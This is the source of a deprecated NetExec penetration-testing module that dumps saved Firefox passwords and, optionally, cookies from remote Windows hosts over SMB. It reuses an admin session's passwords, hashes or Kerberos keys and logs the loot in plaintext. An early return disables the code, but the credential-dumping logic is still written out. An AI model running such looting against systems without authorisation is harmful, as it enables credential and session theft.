from dploot.lib.target import Target
from nxc.helpers.misc import CATEGORY
from nxc.protocols.smb.firefox import FirefoxCookie, FirefoxData, FirefoxTriage


class NXCModule:
    """
    Firefox by @zblurx
    Inspired by firefox looting from DonPAPI
    https://github.com/login-securite/DonPAPI
    """

    name = "firefox"
    description = "[REMOVED] Dump credentials from Firefox"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """
        [REMOVED] use the --dpapi flag instead of the module firefox.

        COOKIES    Get also Firefox cookies
        """
        self.gather_cookies = "COOKIES" in module_options

    def on_admin_login(self, context, connection):
        context.log.fail("[REMOVED] Use the --dpapi flag instead of the module firefox.")
        return

        host = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
        domain = connection.domain
        username = connection.username
        kerberos = connection.kerberos
        aesKey = connection.aesKey
        use_kcache = getattr(connection, "use_kcache", False)
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        target = Target.create(
            domain=domain,
            username=username,
            password=password,
            target=host,
            lmhash=lmhash,
            nthash=nthash,
            do_kerberos=kerberos,
            aesKey=aesKey,
            use_kcache=use_kcache,
        )

        def firefox_callback(secret):
            if isinstance(secret, FirefoxData):
                url = secret.url + " -" if secret.url != "" else "-"
                context.log.highlight(f"[{secret.winuser}] {url} {secret.username}:{secret.password}")
                context.db.add_dpapi_secrets(
                    target.address,
                    "FIREFOX",
                    secret.winuser,
                    secret.username,
                    secret.password,
                    secret.url,
                )
            elif isinstance(secret, FirefoxCookie):
                context.log.highlight(f"[{secret.winuser}] {secret.host}{secret.path} {secret.cookie_name}:{secret.cookie_value}")

        try:
            # Collect Firefox stored secrets
            firefox_triage = FirefoxTriage(target=target, logger=context.log, per_secret_callback=firefox_callback)
            firefox_triage.upgrade_connection(connection=connection.conn)
            firefox_triage.run(gather_cookies=self.gather_cookies)
        except Exception as e:
            context.log.debug(f"Error while looting firefox: {e}")
